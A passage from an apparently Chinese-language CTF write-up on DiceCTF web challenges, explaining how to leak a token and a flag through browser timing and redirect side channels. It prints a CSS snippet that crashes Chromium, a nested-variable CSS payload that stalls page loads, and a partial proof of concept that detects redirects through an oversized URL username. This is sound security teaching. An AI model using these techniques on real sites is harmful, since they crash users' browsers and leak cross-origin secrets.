keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">visit</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'visiting'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname <span class="token operator">===</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">FLAG</span> <span class="token operator">??</span> <span class="token string">'dice&#123;flag&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 browserOpen 的話，可以從 response 中得知。因此看到題目後我就有個想法，如果讓 Chromium crash 會發生什麼事？是不是可以透過這個方式來 leak 出 token？</p><p>舉例來說，假如我們寫一條 CSS 是 <code>h1[data-token^=&quot;0&quot;] &#123; /*crash*/ &#125;</code>，來讓 Chromium crash，那或許就可以加快或是拖慢 bot 執行的時間，進而得知這個 selector 是否符合。</p><p>後來是隊友從 Chromium issues 中找到了讓 Chromium crash 的方式：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">h1[data-token^="a"]</span> <span class="token punctuation">&#123;</span>    <span class="token property">--c1</span><span class="token punctuation">:</span> <span class="token function">color-mix</span><span class="token punctuation">(</span>in srgb<span class="token punctuation">,</span> blue 50%<span class="token punctuation">,</span> red<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">--c2</span><span class="token punctuation">:</span> <span class="token function">srgb</span><span class="token punctuation">(</span>from <span class="token function">var</span><span class="token punctuation">(</span>--c1<span class="token punctuation">)</span> r g b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在賽後討論中也看到 Discord 內有人貼了 payload，讓網頁載入變得超級慢，也可以達到類似的效果，這是 @Trixter 貼的：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">html:has([data-token^="a"])</span> <span class="token punctuation">&#123;</span>      <span class="token property">--a</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/?1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>      <span class="token property">--b</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--c</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--b<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--d</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--e</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--d<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token property">--f</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">var</span><span class="token punctuation">(</span>--e<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">*</span><span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--f<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有點像是 Billion laughs attack 那樣，透過不斷重複構造出一個超大 payload，就可以拖慢速度。</p><p>拖慢速度以後就可以用剛剛講過的方式去測量網頁載入所需要的時間，因為超過 10 秒的話會直接 timeout，藉由這點來 leak 出 flag。</p><h2><span id="webx2fsafestlist-2-solves">web&#x2F;safestlist (2 solves)</span></h2><p>這題是修改自之前我有解過的一個題目：<a href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/">SekaiCTF 2022 筆記與 concurrent limit</a>，我簡單描述一下修改後的版本。</p><p>這個題目是一個經典的 note app，你可以建立新的 note，但問題是 note 內容會先經過 <code>DOMPurify.sanitize</code>，所以沒辦法 XSS。而 CSP 的部分是 <code>default-src &#39;self&#39;</code>，只能往題目的 origin 發送請求。</p><p>也就是說，你沒辦法把請求往外傳。</p><p>除了建立 note 以外，還可以刪除 note，是用 note 的 index 來刪的。</p><p>而這題的核心是這一段建立 note 的程式碼：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>text <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Missing text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> userNotes <span class="token operator">=</span> notes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> totalLen <span class="token operator">=</span> userNotes<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> curr</span><span class="token punctuation">)</span> <span class="token operator">=></span> prev <span class="token operator">+</span> curr<span class="token punctuation">.</span>length<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span>    reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意那個 <code>userNotes.sort();</code>，會根據 note 的內容進行排序。flag 的格式是 <code>dice&#123;[a-z]+&#125;</code>，利用這個排序功能，可以得出一個簡單的策略。</p><p>假設 flag 是 <code>dice&#123;c&#125;</code>，而我們先建立了一個 <code>dice&#123;a</code> 的 note，建立完以後去刪除第一個 note，這時候 <code>dice&#123;a</code> 會被刪掉，留下 flag <code>dice&#123;c&#125;</code>。</p><p>若是我們先建立了 <code>dice&#123;d</code> 的 note，再去刪除第一個，就換成 <code>dice&#123;c&#125;</code> 被刪掉，留下剛剛建立的 <code>dice&#123;d</code>。</p><p>換句話說，建立 note 以後再刪除第一個 note，根據排序的不同，留下來的 note 也不同。</p><p>如果我可以知道最後留下來的 note 是什麼，就能反過來推測出 flag 的順序。如果留下來的是我建立的 note，代表 flag 一定排在前面，字典序也在前面。</p><p>因此這題的重點就是，該怎麼知道留下來的 note 是哪一個？</p><p>根據去年的解法，我一開始的想法一樣是讓 server side busy。Node.js 是 single thread，所以在處理完一個請求之前，是沒辦法接收其他請求的（非同步則是另外一回事）。</p><p>所以我的想法是建立一個 note，裡面有一堆 <code>&lt;img src=/?&#123;random_number&#125;&gt;</code>，在字數限制內大概可以發送 700~1000 個請求左右，藉由發一堆請求給 server，讓 server 變得忙碌。</p><p>這題還有另一點不同，那就是 bot：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">visit</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// clear all data</span>    <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">rm</span><span class="token punctuation">(</span>tmpDir<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">recursive</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">force</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> browser<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// set flag</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"input[type=text]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> flag<span class="token punctuation">;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/create']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// go to the submitted site</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token comment">// restart browser, which should close all windows</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">launchBrowser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// check on notes now that all other windows are closed</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token string">"http://localhost:3000"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">7500</span><span class="token punctuation">,</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"form[action='/view']"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForNavigation</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">waitUntil</span><span class="token operator">:</span> <span class="token string">"networkidle2"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        browser <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>browser<span class="token punctuation">)</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在訪問完我們提供的 URL 以後，bot 才去訪問 <code>/view</code> 頁面，因此這次我們沒辦法從瀏覽器上面去衡量時間，而是要從自己 local 去測量。如果前面講的想法沒錯，照理來說在我們 local 也可以測量出時間，server response time 會變慢。</p><p>但嘗試了大概三四個小時以後，發現行不通。</p><p>理由大概有兩點，第一點是 server 的處理速度太快，我測了一下發送 500 個請求給 localhost，大概 400ms 就處理完了，第二點是時間區間很難抓，很難掌握到「bot 訪問 &#x2F;view」的那段時間。</p><p>總之呢，試了很久都沒辦法得到一個穩定的辦法，只好先放棄了。</p><p>而此時我把注意力轉移到了新增 note 時的這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> newLen <span class="token operator">=</span> totalLen <span class="token operator">+</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newLen <span class="token operator">></span> <span class="token number">16384</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// case 1</span>    <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/?message=Cannot add, please delete some notes first (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>newLen<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> > 16384 chars)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>userNotes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>userNotes<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>notes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>id<span class="token punctuation">,</span> userNotes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// case2</span>reply<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/?message=Note added successfully"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果筆記長度超出 16384，會重新導向到 <code>/?message=Cannot add, please delete some notes first</code>，反之則導向至 <code>/?message=Note added successfully</code>，換言之，如果可以偵測出導向到的是哪一個，一樣可以利用類似的手法 leak 出 flag。</p><p>我有個想法是猜測瀏覽器對於網址長度應該會有限制，可以試著構造出一個超長的網址，導向到 <code>/?message=Cannot add, please delete some notes first</code> 時會超過限制，而導向到 <code>/?message=Note added successfully</code> 時則不會。</p><p>但問題是這邊我們沒辦法控制 path 的長度，那該怎麼讓網址變長？</p><p>我試了一下 username，例如說：<code>http://$&#123;&#39;a&#39;.repeat(1000000)&#125;&#125;:pwd@localhost:3000</code>，發現居然成功了！</p><p>細節可以看底下這個 PoC：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span>  <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>winForm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/hang'</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'about:blank'</span><span class="token punctuation">,</span> <span class="token string">'winForm'</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token string">'http://'</span><span class="token operator">+</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2097050</span><span class="token punctuation">)</span>  <span class="token operator">+</span> <span class="token string">':def@localhost:3000'</span>    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/create'</span>    inp<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/timeout'</span><span class="token operator">+</span>count<span class="token punctuation">)</span>      count<span class="token operator">++</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> r <span class="token operator">=</span> win<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/?r='</span> <span class="token operator">+</span> r<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/err'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span>        </span></span><span class="token tag"><span class="token tag"><span class="token 